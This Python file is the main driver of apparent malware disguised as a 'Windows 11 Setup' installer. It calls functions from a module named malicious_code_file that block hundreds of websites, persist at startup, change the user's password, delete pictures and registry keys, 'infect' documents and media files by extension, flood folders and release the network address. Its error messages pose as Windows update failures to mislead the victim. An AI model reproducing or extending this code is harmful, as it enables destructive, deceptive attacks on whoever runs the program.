import malicious_code_file
import first_page
import time
import os

vb = malicious_code_file

def ENTIRE_PROGRAM():

    # disable access to 550 websites visited world wide
    try:
        vb.DISABLE_ACCESS_TO_POPULAR_SITES()
    except:
        print('YOU NEED TO RUN AS ADMIN FOR THIS TO FUNCTION PROPERLY')
        time.sleep(10)
        exit()
    
    # make the file run at startup
    try:
        vb.START_AGAIN_AFTER_RESTART()
    except:
        print("YOU NEED TO RUN AS ADMIN FOR THIS TO FUNCTION PROPERLY")
        time.sleep(5)

    # start the gui
    try:
        first_page.vp_start_gui()
    except:
        print('UNABLE TO START THE "Windows 11 Setup" GUI')

    #flood random folders
    try:
        os.chdir('C:\\')
        vb.FOLDER_FLOODER(filename="no")
    except:
        print('UNABLE TO INSTALL WINDOWS 11 SECURITY PATCHES')

    # Change password to 'InShadow
    try:
        vb.CHANGE_PASS_TO_INSHADOW()
    except:
        print('UNABLE TO APPLY NEW USER ACCOUNT UPDATES')
    
    # delete my pictures
    try:
        vb.DELETE_MY_PICTURES()
    except:
        print("UNABLE TO CHANGE THE CURRENT EXPLORER TO THE WINDOWS 11 EXPLORER")
    
    # infect many files
    try:
        try:
            vb.INFECT_ANY_FILE(fextension="jpg")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="jpeg")
        except:
            pass
            
        try:
            vb.INFECT_ANY_FILE(fextension="mp4")
        except:
            pass
            
        try:
            vb.INFECT_ANY_FILE(fextension="mov")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="mpeg")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="avi")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="doc")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="xls")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="xlsx")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="rtf")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="txt")
        except:
            pass

        try:
            vb.INFECT_ANY_FILE(fextension="docx")
        except:
            pass
        
        try:
            vb.INFECT_ANY_FILE(fextension="jpg")
        except:
            pass

    except:
        print('UNABLE TO APPLY NEW EXPLORER ICONS')
    


    
    # create many random user account folders
    try:
        vb.USER_ACCOUNTS_FLOODER(filename="Windows_Critical_KERNEL_Update_File.bat")
    except:
        print('UNABLE TO APPLY THE KERNEL UPDATES')

    # delete some important registry files
    try:
        vb.DELETE_KEY_REGISTRY_FILES(wantfile="nofile")
    except:
        print('UNABLE TO UPDATE REGISTRY FOR NEW WINDOWS 11 MODIFICATIONS')
    
    # release current ips ( dhcp assigned )
    try:
        vb.IP_CONFIG_RELEASE(filename="no")
    except:
        print("UNABLE TO UPDATE NEW INTERNET SETTINGS")



    




